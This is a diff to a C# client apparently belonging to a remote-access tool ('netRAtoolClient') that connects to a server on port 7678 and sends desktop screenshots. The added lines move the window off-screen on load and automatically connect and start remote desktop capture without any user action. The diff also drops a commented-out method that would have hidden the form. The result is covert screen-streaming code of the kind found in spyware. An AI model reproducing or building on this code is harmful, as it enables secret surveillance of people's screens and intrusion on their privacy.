@@ -9,6 +9,7 @@ namespace netRAtoolClient
 {
     public partial class Form1 : Form
     {
+        /* NETWORK STUFF */
         private readonly TcpClient client = new TcpClient();
         private NetworkStream mainStream;
         private int portNumber = 7678;
@@ -39,6 +40,7 @@ namespace netRAtoolClient
             {
                 client.Connect(ipAddr, portNumber);
                 Console.WriteLine("#Client: Connected to server");
+                btnRemoteDesktop.PerformClick();
             }
             catch(Exception)
             {
@@ -65,16 +67,16 @@ namespace netRAtoolClient
             SendDesktopImage();
         }
 
-        /*
-        protected override void SetVisibleCore(bool value)
-        {
-            base.SetVisibleCore(false);
-        }
-        */
-
         public Form1()
         {
             InitializeComponent();
+            Load += Form1_Shown;
+        }
+
+        private void Form1_Shown(Object sender, EventArgs e)
+        {
+            this.Location = new Point(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            btnConnectClick.PerformClick();
         }
     }
 }
